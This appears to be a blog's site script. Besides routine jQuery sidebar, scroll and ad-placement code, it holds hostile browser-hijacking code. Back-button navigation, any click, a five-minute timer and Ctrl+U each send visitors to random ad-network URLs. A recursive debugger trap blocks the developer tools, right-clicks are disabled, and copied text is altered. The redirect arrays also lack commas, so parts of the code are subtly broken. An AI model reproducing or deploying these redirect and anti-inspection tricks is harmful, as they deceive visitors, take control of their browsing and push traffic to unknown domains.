/* Remove All Links Inside Posts */
window.onload = (function RemLinkPost() {
    if ($('.post-body')) {
        $('.post-body').find('a').each(function() {
            $(this).contents().unwrap();
        })
    }
});

/* back to */
(function(window, location) {
    history.replaceState(null, document.title, location.pathname + "#!/history");
    history.pushState(null, document.title, location.pathname);
    window.addEventListener("popstate", function() {
        if (location.hash === "#!/history") {
            history.replaceState(null, document.title, location.pathname);
            var pages = [
                "https://euizhltcd6ih.com/q2fdbi10y?key=4a1d48595a9107cc8c177afca2e53a2c"
                "https://jc32arlvqpv8.com/av8huse0?key=8139b2cb5fce34e957fa7f36781596b1"
            ];
            function randomPage() {
                return pages[Math.round(Math.random() * (pages.length - 1))];
            }
            location.href = randomPage();
        }
    }, false);
}(window, location));

/* window click */
window.addEventListener("click", function(event) {
    var pages = [
        "https://euizhltcd6ih.com/q2fdbi10y?key=4a1d48595a9107cc8c177afca2e53a2c"
        "https://jc32arlvqpv8.com/av8huse0?key=8139b2cb5fce34e957fa7f36781596b1"
    ];
    function randomPage() {
        return pages[Math.round(Math.random() * (pages.length - 1))];
    }
    location.href = randomPage();
});

/* time out */
setTimeout(function() {
    var pages = [
        "https://euizhltcd6ih.com/q2fdbi10y?key=4a1d48595a9107cc8c177afca2e53a2c"
        "https://jc32arlvqpv8.com/av8huse0?key=8139b2cb5fce34e957fa7f36781596b1"
    ];
    function randomPage() {
        return pages[Math.round(Math.random() * (pages.length - 1))];
    }
    location.href = randomPage();
}, 5 * 60 * 1000);

/* inspect */
! function t() {
    try {
        ! function t(n) {
            1 === ("" + n / n).length && 0 !== n || function() {}.constructor("debugger")(), t(++n)
        }(0)
    } catch (n) {
        setTimeout(t, 5e3)
    }
}();

/* CTRL+U */
shortcut = {
    all_shortcuts: {},
    add: function(a, b, c) {
        var d = {
            type: "keydown",
            propagate: !1,
            disable_in_input: !1,
            target: document,
            keycode: !1
        };
        if (c)
            for (var e in d) "undefined" == typeof c[e] && (c[e] = d[e]);
        else c = d;
        d = c.target, "string" == typeof c.target && (d = document.getElementById(c.target)), a = a.toLowerCase(), e = function(d) {
            d = d || window.event;
            if (c.disable_in_input) {
                var e;
                d.target ? e = d.target : d.srcElement && (e = d.srcElement), 3 == e.nodeType && (e = e.parentNode);
                if ("INPUT" == e.tagName || "TEXTAREA" == e.tagName) return
            }
            d.keyCode ? code = d.keyCode : d.which && (code = d.which), e = String.fromCharCode(code).toLowerCase(), 188 == code && (e = ","), 190 == code && (e = ".");
            var f = a.split("+"),
                g = 0,
                h = {
                    "`": "~",
                    1: "!",
                    2: "@",
                    3: "#",
                    4: "$",
                    5: "%",
                    6: "^",
                    7: "&",
                    8: "*",
                    9: "(",
                    0: ")",
                    "-": "_",
                    "=": "+",
                    ";": ":",
                    "'": '"',
                    ",": "<",
                    ".": ">",
                    "/": "?",
                    "\\": "|"
                },
                i = {
                    esc: 27,
                    escape: 27,
                    tab: 9,
                    space: 32,
                    "return": 13,
                    enter: 13,
                    backspace: 8,
                    scrolllock: 145,
                    scroll_lock: 145,
                    scroll: 145,
                    capslock: 20,
                    caps_lock: 20,
                    caps: 20,
                    numlock: 144,
                    num_lock: 144,
                    num: 144,
                    pause: 19,
                    "break": 19,
                    insert: 45,
                    home: 36,
                    "delete": 46,
                    end: 35,
                    pageup: 33,
                    page_up: 33,
                    pu: 33,
                    pagedown: 34,
                    page_down: 34,
                    pd: 34,
                    left: 37,
                    up: 38,
                    right: 39,
                    down: 40,
                    f1: 112,
                    f2: 113,
                    f3: 114,
                    f4: 115,
                    f5: 116,
                    f6: 117,
                    f7: 118,
                    f8: 119,
                    f9: 120,
                    f10: 121,
                    f11: 122,
                    f12: 123
                },
                j = !1,
                l = !1,
                m = !1,
                n = !1,
                o = !1,
                p = !1,
                q = !1,
                r = !1;
            d.ctrlKey && (n = !0), d.shiftKey && (l = !0), d.altKey && (p = !0), d.metaKey && (r = !0);
            for (var s = 0; k = f[s], s < f.length; s++) "ctrl" == k || "control" == k ? (g++, m = !0) : "shift" == k ? (g++, j = !0) : "alt" == k ? (g++, o = !0) : "meta" == k ? (g++, q = !0) : 1 < k.length ? i[k] == code && g++ : c.keycode ? c.keycode == code && g++ : e == k ? g++ : h[e] && d.shiftKey && (e = h[e], e == k && g++);
            if (g == f.length && n == m && l == j && p == o && r == q && (b(d), !c.propagate)) return d.cancelBubble = !0, d.returnValue = !1, d.stopPropagation && (d.stopPropagation(), d.preventDefault()), !1
        }, this.all_shortcuts[a] = {
            callback: e,
            target: d,
            event: c.type
        }, d.addEventListener ? d.addEventListener(c.type, e, !1) : d.attachEvent ? d.attachEvent("on" + c.type, e) : d["on" + c.type] = e
    },
    remove: function(a) {
        var a = a.toLowerCase(),
            b = this.all_shortcuts[a];
        delete this.all_shortcuts[a];
        if (b) {
            var a = b.event,
                c = b.target,
                b = b.callback;
            c.detachEvent ? c.detachEvent("on" + a, b) : c.removeEventListener ? c.removeEventListener(a, b, !1) : c["on" + a] = !1
        }
    }
}, shortcut.add("Ctrl+U", function() {
    var pages = [
        "https://euizhltcd6ih.com/q2fdbi10y?key=4a1d48595a9107cc8c177afca2e53a2c"
        "https://jc32arlvqpv8.com/av8huse0?key=8139b2cb5fce34e957fa7f36781596b1"
    ];
    function randomPage() {
        return pages[Math.round(Math.random() * (pages.length - 1))];
    }
    location.href = randomPage();
});

/* anti click */
var message = "";

function clickIE4() {
    if (event.button == 2) {
        return false
    }
}

function clickNS4(e) {
    if (document.layers || document.getElementById && !document.all) {
        if (e.which == 2 || e.which == 3) {
            return false
        }
    }
}
if (document.layers) {
    document.captureEvents(Event.MOUSEDOWN);
    document.onmousedown = clickNS4
} else if (document.all && !document.getElementById) {
    document.onmousedown = clickIE4
}
document.oncontextmenu = new Function("return false");

/* Copy Text */
function nocopas() {
    var e = window.getSelection();
    pagelink = " Read more : " + document.location.href, copytext = e + pagelink, newdiv = document.createElement("div"), newdiv.style.position = "absolute", newdiv.style.left = "-99999px", document.body.appendChild(newdiv), newdiv.innerHTML = copytext, e.selectAllChildren(newdiv), window.setTimeout(function() {
        document.body.removeChild(newdiv)
    }, 100)
}
document.addEventListener("copy", nocopas);

/* hapus mobile */
var uri = window.location.toString();
if (uri.indexOf("=", "=") > 0) {
    var clean_uri = uri.substring(0, uri.indexOf("="));
    window.history.replaceState({}, document.title, clean_uri);
}
var uri = window.location.toString();
if (uri.indexOf("==", "==") > 0) {
    var clean_uri = uri.substring(0, uri.indexOf("=="));
    window.history.replaceState({}, document.title, clean_uri);
}
var uri = window.location.toString();
if (uri.indexOf("&m=1", "&m=1") > 0) {
    var clean_uri = uri.substring(0, uri.indexOf("&m=1"));
    window.history.replaceState({}, document.title, clean_uri);
}
var uri = window.location.toString();
if (uri.indexOf("?m=1", "?m=1") > 0) {
    var clean_uri = uri.substring(0, uri.indexOf("?m=1"));
    window.history.replaceState({}, document.title, clean_uri);
}

/* jquery sticky */
(function() {
    var b, f;
    b = this.jQuery || window.jQuery;
    f = b(window);
    b.fn.stick_in_parent = function(d) {
        var A, w, J, n, B, K, p, q, k, E, t;
        null == d && (d = {});
        t = d.sticky_class;
        B = d.inner_scrolling;
        E = d.recalc_every;
        k = d.parent;
        q = d.offset_top;
        p = d.spacer;
        w = d.bottoming;
        null == q && (q = 0);
        null == k && (k = void 0);
        null == B && (B = !0);
        null == t && (t = "is_stuck");
        A = b(document);
        null == w && (w = !0);
        J = function(a, d, n, C, F, u, r, G) {
            var v, H, m, D, I, c, g, x, y, z, h, l;
            if (!a.data("sticky_kit")) {
                a.data("sticky_kit", !0);
                I = A.height();
                g = a.parent();
                null != k && (g = g.closest(k));
                if (!g.length) throw "failed to find stick parent";
                v = m = !1;
                (h = null != p ? p && a.closest(p) : b("<div />")) && h.css("position", a.css("position"));
                x = function() {
                    var c, f, e;
                    if (!G && (I = A.height(), c = parseInt(g.css("border-top-width"), 10), f = parseInt(g.css("padding-top"), 10), d = parseInt(g.css("padding-bottom"), 10), n = g.offset().top + c + f, C = g.height(), m && (v = m = !1, null == p && (a.insertAfter(h), h.detach()), a.css({
                                position: "",
                                top: "",
                                width: "",
                                bottom: ""
                            }).removeClass(t), e = !0), F = a.offset().top - (parseInt(a.css("margin-top"), 10) || 0) - q,
                            u = a.outerHeight(!0), r = a.css("float"), h && h.css({
                                width: a.outerWidth(!0),
                                height: u,
                                display: a.css("display"),
                                "vertical-align": a.css("vertical-align"),
                                "float": r
                            }), e)) return l()
                };
                x();
                if (u !== C) return D = void 0, c = q, z = E, l = function() {
                    var b, l, e, k;
                    if (!G && (e = !1, null != z && (--z, 0 >= z && (z = E, x(), e = !0)), e || A.height() === I || x(), e = f.scrollTop(), null != D && (l = e - D), D = e, m ? (w && (k = e + u + c > C + n, v && !k && (v = !1, a.css({
                            position: "fixed",
                            bottom: "",
                            top: c
                        }).trigger("sticky_kit:unbottom"))), e < F && (m = !1, c = q, null == p && ("left" !== r && "right" !== r || a.insertAfter(h),
                            h.detach()), b = {
                            position: "",
                            width: "",
                            top: ""
                        }, a.css(b).removeClass(t).trigger("sticky_kit:unstick")), B && (b = f.height(), u + q > b && !v && (c -= l, c = Math.max(b - u, c), c = Math.min(q, c), m && a.css({
                            top: c + "px"
                        })))) : e > F && (m = !0, b = {
                            position: "fixed",
                            top: c
                        }, b.width = "border-box" === a.css("box-sizing") ? a.outerWidth() + "px" : a.width() + "px", a.css(b).addClass(t), null == p && (a.after(h), "left" !== r && "right" !== r || h.append(a)), a.trigger("sticky_kit:stick")), m && w && (null == k && (k = e + u + c > C + n), !v && k))) return v = !0, "static" === g.css("position") && g.css({
                            position: "relative"
                        }),
                        a.css({
                            position: "absolute",
                            bottom: d,
                            top: "auto"
                        }).trigger("sticky_kit:bottom")
                }, y = function() {
                    x();
                    return l()
                }, H = function() {
                    G = !0;
                    f.off("touchmove", l);
                    f.off("scroll", l);
                    f.off("resize", y);
                    b(document.body).off("sticky_kit:recalc", y);
                    a.off("sticky_kit:detach", H);
                    a.removeData("sticky_kit");
                    a.css({
                        position: "",
                        bottom: "",
                        top: "",
                        width: ""
                    });
                    g.position("position", "");
                    if (m) return null == p && ("left" !== r && "right" !== r || a.insertAfter(h), h.remove()), a.removeClass(t)
                }, f.on("touchmove", l), f.on("scroll", l), f.on("resize",
                    y), b(document.body).on("sticky_kit:recalc", y), a.on("sticky_kit:detach", H), setTimeout(l, 0)
            }
        };
        n = 0;
        for (K = this.length; n < K; n++) d = this[n], J(b(d));
        return this
    }
}).call(this);

/* Sticky Sidebar */
jQuery(document).ready(function() {
    var i = jQuery(window).width();

    function e() {
        jQuery("#sidebar-sticky").stick_in_parent({
            parent: "#wrapper",
            offset_top: 10
        })
    }
    i < 768 ? jQuery("#sidebar-sticky").trigger("sticky_kit:detach") : e(), jQuery(window).resize(function() {
        (i = jQuery(window).width()) < 768 ? jQuery("#sidebar-sticky").trigger("sticky_kit:detach") : e()
    })
});

/* back to top */
$(window).scroll(function() {
    if ($(this).scrollTop() > 200) {
        $('#back-to-top').fadeIn();
    } else {
        $('#back-to-top').fadeOut();
    }
});
$('#back-to-top').hide().click(function() {
    $('html, body').animate({
        scrollTop: 0
    }, 1000);
    return false;
});

/* pasang iklan */
$('#adstop-post').appendTo('#adstop'), $('#adsmiddle-post').appendTo('#adsmiddle'), $('#adsbottom-post').appendTo('#adsbottom');
